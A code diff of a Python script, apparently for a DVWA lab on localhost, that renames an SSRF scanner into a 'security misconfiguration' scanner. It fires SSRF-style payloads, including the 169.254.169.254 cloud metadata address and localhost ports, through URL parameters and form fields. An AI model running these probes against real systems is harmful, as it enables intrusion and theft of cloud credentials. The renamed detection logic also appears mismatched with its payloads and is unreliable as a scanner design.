@@ -8,8 +8,8 @@ from colorama import Fore
 
 # Configuration
 base_url = "http://127.0.0.1:42001/"
-vuln_url = base_url + "vulnerable-endpoint"
-ssrf_url = "http://127.0.0.1:80/admin"  # Internal service we want to access
+vuln_url = base_url + "misconfigured-endpoint"
+misconfigured_url = "http://127.0.0.1:80/admin"  # Misconfigured service we want to access
 
 # Headers
 headers = {
@@ -55,13 +55,12 @@ def get_details(form):
     details["inputs"] = inputs
     return details
 
-def is_vuln(response):
+def is_misconfigured(response):
     indicators = {
-        "internal",
-        "localhost",
-        "169.254.",
-        "0.0.0.0",
-        "127.0.0.1"
+        "config_error",
+        "misconfigured",
+        "unauthorized",
+        "access_denied"
     }
     try:
         for indicator in indicators:
@@ -73,16 +72,16 @@ def is_vuln(response):
     except requests.exceptions.RequestException:
         pass
 
-def scan_ssrf(url):
+def scan_misconfiguration(url):
     f = open("vuln.txt", "a+")
     try:
-        payloads = ["http://localhost", "http://127.0.0.1", "http://169.254.169.254"]
+        payloads = ["http://misconfigured-url", "http://127.0.0.1/misconfig", "http://169.254.169.254/misconfig"]
         for payload in payloads:
-            new_url = f"{url}?url={payload}"
+            new_url = f"{url}?config={payload}"
             print(f"{Fore.WHITE}[CONSOLE] Trying: {new_url}")
             r = s.get(new_url)
-            if is_vuln(r):
-                print(f"{Fore.GREEN}[CONSOLE] Found SSRF vulnerability! " + new_url)
+            if is_misconfigured(r):
+                print(f"{Fore.GREEN}[CONSOLE] Found Security Misconfiguration vulnerability! " + new_url)
                 f.write(new_url + "\n")
                 f.close()
                 return
@@ -95,8 +94,8 @@ def scan_ssrf(url):
         for form in forms:
             form_details = get_details(form)
             
-            # Test for advanced SSRF payloads
-            if test_advanced_ssrf(url, form_details):
+            # Test for advanced misconfiguration payloads
+            if test_advanced_misconfig(url, form_details):
                 return
 
             # Continue with original payloads
@@ -116,8 +115,8 @@ def scan_ssrf(url):
                 elif form_details["method"] == "get":
                     r = s.get(form_url, params=data)
 
-                if is_vuln(r):
-                    print(f"{Fore.GREEN}[CONSOLE] Found SSRF vulnerability in form! " + form_url)
+                if is_misconfigured(r):
+                    print(f"{Fore.GREEN}[CONSOLE] Found Security Misconfiguration vulnerability in form! " + form_url)
                     f.write(form_url + "\n")
                     return
                 else:
@@ -126,7 +125,7 @@ def scan_ssrf(url):
     except requests.exceptions.RequestException as e:
         print(f"{Fore.RED}[CONSOLE] Request exception: {e}")
 
-def test_advanced_ssrf(url, form_details):
+def test_advanced_misconfig(url, form_details):
     advanced_payloads = [
         "http://localhost:8080",
         "http://127.0.0.1:8080",
@@ -148,8 +147,8 @@ def test_advanced_ssrf(url, form_details):
         elif form_details["method"] == "get":
             r = s.get(form_url, params=data)
 
-        if is_vuln(r):
-            print(f"{Fore.GREEN}[CONSOLE] Found advanced SSRF vulnerability in form! " + form_url)
+        if is_misconfigured(r):
+            print(f"{Fore.GREEN}[CONSOLE] Found advanced Security Misconfiguration vulnerability in form! " + form_url)
             with open("vuln.txt", "a+") as f:
                 f.write(form_url + "\n")
             return True
@@ -165,7 +164,7 @@ def start_scan():
                 if checked < len(R):
                     for url in R:
                         time.sleep(delay)
-                        t = threading.Thread(target=scan_ssrf, args=(url.strip(),))
+                        t = threading.Thread(target=scan_misconfiguration, args=(url.strip(),))
                         t.start()
                         checked += 1
                         threads.append(t)
@@ -178,7 +177,7 @@ def start_scan():
     except requests.exceptions.RequestException as e:
         print(f"{Fore.RED}[CONSOLE] Request exception: {e}")
 
-def start_ssrf_scan():
+def start_misconfig_scan():
     global thr, delay, checked, s
     warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
@@ -191,7 +190,7 @@ def start_ssrf_scan():
     # Create and initialize the vuln.txt file
     with open("vuln.txt", "w") as f:
         f.write("# vuln.txt\n\n")
-        f.write("# This file will be used to log URLs that have SSRF vulnerabilities.\n")
+        f.write("# This file will be used to log URLs that have Security Misconfiguration vulnerabilities.\n")
         f.write("# The script will append new URLs to this file as it finds them.\n\n")
 
     # Login to DVWA
@@ -206,6 +205,5 @@ def start_ssrf_scan():
     checked = 0
     start_scan()
 
-# Start the SSRF scan process
-start_ssrf_scan()
-
+# Start the Misconfiguration scan process
+start_misconfig_scan()
